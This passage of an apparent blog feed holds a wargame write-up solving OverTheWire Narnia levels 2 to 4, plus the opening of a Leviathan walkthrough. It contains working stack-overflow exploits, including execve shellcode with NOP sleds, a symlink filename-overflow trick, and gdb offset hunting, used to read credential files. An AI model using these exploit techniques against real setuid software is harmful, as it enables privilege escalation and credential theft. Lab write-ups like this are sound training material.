&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia2@melinda:/narnia$ ./narnia2 &lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;\x90&amp;#39;*115 + &amp;#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&amp;#39; + &amp;#39;\x60\xd8\xff\xff&amp;#39;&amp;quot;`&lt;/span&gt;
$ whoami
narnia3
$ cat /etc/narnia_pass/narnia3
[password]
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h2 id=&#34;level-03:dadecd8e397495e170ebcbe00dd8239d&#34;&gt;Level 03&lt;/h2&gt;

&lt;p&gt;&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;sys/types.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;sys/stat.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;fcntl.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;string.h&amp;gt; &lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv){&lt;/span&gt;
 
        &lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt;  &lt;span style=&#34;color: #f8f8f2&#34;&gt;ifd,&lt;/span&gt;  &lt;span style=&#34;color: #f8f8f2&#34;&gt;ofd;&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;ofile[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;16&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/dev/null&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;ifile[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buf[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;
 
        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(argc&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;){&lt;/span&gt;
                &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;usage, %s file, will send contents of file 2 /dev/null&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
                &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
 
        &lt;span style=&#34;color: #75715e&#34;&gt;/* open files */&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;strcpy(ifile,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;((ofd&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;open(ofile,O_RDWR))&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;){&lt;/span&gt;
                &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;error opening %s&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;ofile);&lt;/span&gt;
                &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;((ifd&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;open(ifile,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;O_RDONLY))&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;){&lt;/span&gt;
                &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;error opening %s&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;ifile);&lt;/span&gt;
                &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
 
        &lt;span style=&#34;color: #75715e&#34;&gt;/* copy from file1 to file2 */&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;read(ifd,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buf,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(buf)&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;write(ofd,buf,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(buf)&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;copied contents of %s to a safer place... (%s)&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,ifile,ofile);&lt;/span&gt;
 
        &lt;span style=&#34;color: #75715e&#34;&gt;/* close &amp;#39;em */&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;close(ifd);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;close(ofd);&lt;/span&gt;
 
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;

&lt;p&gt;At first glance this looks a bit more complicated. However it is just another
buffer overflow (line 13 and 22). This time however we don&amp;rsquo;t control the stack,
we control where the file gets written to. &lt;code&gt;/dev/null&lt;/code&gt; is not a useful place
for data, and we want the contents of &lt;code&gt;/etc/narnia_pass/narnia4&lt;/code&gt;. As &lt;code&gt;narnia3&lt;/code&gt; runs
setuid narnia4, it can do that for us.&lt;/p&gt;

&lt;p&gt;First we determine that we need 32 characters to overflow the buffer. Then anything
beyond that will get written to the ofile. So the plan is to to create a symlink to
&lt;code&gt;narnia4&lt;/code&gt; that is 32 characters long, and then write that to the target. The issue here
is that the source path&amp;rsquo;s last 16 characters need to be the same as the target.
So to do this I created the following directory and symlink:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia3@melinda:/narnia$ mkdir -p /tmp/xxxxxxxxxxxxxxxxxxxxxxxxxxx/tmp
narnia3@melinda:/narnia$ ln -s /etc/narnia_pass/narnia4 /tmp/xxxxxxxxxxxxxxxxxxxxxxxxxxx/tmp/narn4
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Now when we pass that to &lt;code&gt;narnia3&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia3@melinda:/narnia$ ./narnia3 &lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;/tmp/&amp;#39; + &amp;#39;x&amp;#39;*27 + &amp;#39;/tmp/narn4&amp;#39;&amp;quot;`&lt;/span&gt; 
copied contents of /tmp/xxxxxxxxxxxxxxxxxxxxxxxxxxx/tmp/narn4 to a safer place... (/tmp/narn4)
narnia3@melinda:/narnia$ cat /tmp/narn4 
[password]
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;It&amp;rsquo;s a little odd, but I hope you understand what happened. The last part of the
first path has to be a valid path, so that it can be written to. That&amp;rsquo;s why we have
the double &lt;code&gt;/tmp&lt;/code&gt; setup.&lt;/p&gt;

&lt;h2 id=&#34;level-04:dadecd8e397495e170ebcbe00dd8239d&#34;&gt;Level 04&lt;/h2&gt;

&lt;p&gt;&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;ctype.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;extern&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;environ;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv){&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i;&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;256&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;

	&lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(i&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;environ[i]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;NULL;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;memset(environ[i],&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;strlen(environ[i]));&lt;/span&gt;

	&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(argc&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;strcpy(buffer,argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;

	&lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;

&lt;p&gt;MOAR OVERFLOWS. This time you&amp;rsquo;ll notice something at line 6. What this does
is &lt;a href=&#34;http://man7.org/linux/man-pages/man7/environ.7.html&#34;&gt;store the user environment&lt;/a&gt;.
This then get zerod out inside &lt;code&gt;main&lt;/code&gt; to prevent us from storing any shellcode
in environment variables. However we might still be able to write &lt;code&gt;EIP&lt;/code&gt;, so using the
trusty pattern generator from before&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;local $] ./pattern.py 300
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7
Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5
Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3
Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia4@melinda:/narnia$ gdb -q ./narnia4 
Reading symbols from ./narnia4...(no debugging symbols found)...done.
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5
Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4
Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3
Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
Starting program: /games/narnia/narnia4 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5
Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4
Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3
Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9

Program received signal SIGSEGV, Segmentation fault.
0x316a4130 in ?? ()
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;local $] ./pattern.py 0x316a4130
Pattern 0x316a4130 first occurrence at position 272 in pattern.
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;This tells us we have 272 bytes to play with. Plenty of space to construct
a nopsled and shellcode payload. Let&amp;rsquo;s find out what we need to write into
&lt;code&gt;EIP&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;(gdb) r $(python -c &amp;quot;print &amp;#39;a&amp;#39;*272 + &amp;#39;bbbb&amp;#39;&amp;quot;)
Starting program: /games/narnia/narnia4 $(python -c &amp;quot;print &amp;#39;a&amp;#39;*272 + &amp;#39;bbbb&amp;#39;&amp;quot;)

Program received signal SIGSEGV, Segmentation fault.
0x62626262 in ?? ()
(gdb) x/200x $esp
0xffffd5c0:	0x00000000	0xffffd654	0xffffd660	0xf7feacea
0xffffd5d0:	0x00000002	0xffffd654	0xffffd5f4	0x080497cc
0xffffd5e0:	0x0804825c	0xf7fca000	0x00000000	0x00000000
0xffffd5f0:	0x00000000	0x7cc8a421	0x44f76031	0x00000000
0xffffd600:	0x00000000	0x00000000	0x00000002	0x080483b0
0xffffd610:	0x00000000	0xf7ff0500	0xf7e3c979	0xf7ffd000
0xffffd620:	0x00000002	0x080483b0	0x00000000	0x080483d1
0xffffd630:	0x080484ad	0x00000002	0xffffd654	0x08048550
0xffffd640:	0x080485c0	0xf7feb180	0xffffd64c	0x0000001c
0xffffd650:	0x00000002	0xffffd78f	0xffffd7a5	0x00000000
0xffffd660:	0xffffd8ba	0xffffd8ce	0xffffd8de	0xffffd8f1
0xffffd670:	0xffffd914	0xffffd927	0xffffd930	0xffffd93d
0xffffd680:	0xffffde5e	0xffffde69	0xffffde75	0xffffded3
0xffffd690:	0xffffdeea	0xffffdef9	0xffffdf05	0xffffdf16
0xffffd6a0:	0xffffdf1f	0xffffdf32	0xffffdf3a	0xffffdf4a
0xffffd6b0:	0xffffdf80	0xffffdfa0	0xffffdfc0	0x00000000
0xffffd6c0:	0x00000020	0xf7fdbb60	0x00000021	0xf7fdb000
0xffffd6d0:	0x00000010	0x1f898b75	0x00000006	0x00001000
0xffffd6e0:	0x00000011	0x00000064	0x00000003	0x08048034
0xffffd6f0:	0x00000004	0x00000020	0x00000005	0x00000008
0xffffd700:	0x00000007	0xf7fdc000	0x00000008	0x00000000
0xffffd710:	0x00000009	0x080483b0	0x0000000b	0x000036b4
0xffffd720:	0x0000000c	0x000036b4	0x0000000d	0x000036b4
0xffffd730:	0x0000000e	0x000036b4	0x00000017	0x00000000
0xffffd740:	0x00000019	0xffffd76b	0x0000001f	0xffffdfe2
0xffffd750:	0x0000000f	0xffffd77b	0x00000000	0x00000000
0xffffd760:	0x00000000	0x00000000	0x9e000000	0x9213cb6c
0xffffd770:	0x8eef41b1	0xe0574cc7	0x69a73659	0x00363836
0xffffd780:	0x00000000	0x00000000	0x00000000	0x2f000000
0xffffd790:	0x656d6167	0x616e2f73	0x61696e72	0x72616e2f
0xffffd7a0:	0x3461696e	0x61616100	0x61616161	0x61616161
0xffffd7b0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd7c0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd7d0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd7e0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd7f0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd800:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd810:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd820:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd830:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd840:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd850:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd860:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd870:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd880:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd890:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd8a0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd8b0:	0x61616161	0x62626261	0x00000062	0x00000000
0xffffd8c0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd8d0:	0x00000000	0x00000000	0x00000000	0x00000000
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Our input starts at around &lt;em&gt;0xffffd7a8&lt;/em&gt; so let&amp;rsquo;s get going writing our payload.
Create a nopsled that is &lt;em&gt;272 - 25&lt;/em&gt; bytes long, follow that with the
the same shellcode as before, and finish with an address that sits comfortably
in the sled. You normally need to play with the address a bit, as the offsets
inside &lt;em&gt;gdb&lt;/em&gt; are a bit different.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia4@melinda:/narnia$ ./narnia4 &lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;\x90&amp;#39;*(272-25) + &amp;#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&amp;#39; + &amp;#39;\x30\xd8\xff\xff&amp;#39;&amp;quot;`&lt;/span&gt;
$ whoami
narnia5
$ cat /etc/narnia_pass/narnia5
[password]
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Solving Leviathan</title>
      <link>http://unlogic.co.uk/2015/03/23/solving-leviathan/</link>
      <pubDate>Mon, 23 Mar 2015 00:00:00 +0000</pubDate>
      
      <guid>http://unlogic.co.uk/2015/03/23/solving-leviathan/</guid>
      <description>

&lt;p&gt;After having done &lt;a href=&#34;http://overthewire.org/wargames/bandit/&#34;&gt;Bandit&lt;/a&gt;, let&amp;rsquo;s move
on to &lt;a href=&#34;http://overthewire.org/wargames/leviathan/&#34;&gt;Leviathan&lt;/a&gt;. None of the levels
have hints, so there won&amp;rsquo;t be any links to each of the levels.&lt;/p&gt;

&lt;p&gt;Without further ado, let&amp;rsquo;s get cracking.&lt;/p&gt;

&lt;h1 id=&#34;level-0-1:233d21a5a4a7da288bb6120215cbabbb&#34;&gt;Level 0 -&amp;gt; 1&lt;/h1&gt;

&lt;p&gt;Logging in with &lt;code&gt;leviathan0:leviathan0&lt;/code&gt; we take a quick look around to see
what we have to work with, if anything&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;leviathan0@melinda:~$ ls -la
total 24
drwxr-xr-x   3 root       root       4096 Nov 14 10:32 .
drwxr-xr-x 167 root       root       4096 Mar 21 06:46 ..
drwxr-x---   2 leviathan1 leviathan0 4096 Feb 10 18:08 .backup
-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
&lt;/pre&gt;&lt;/div&gt;


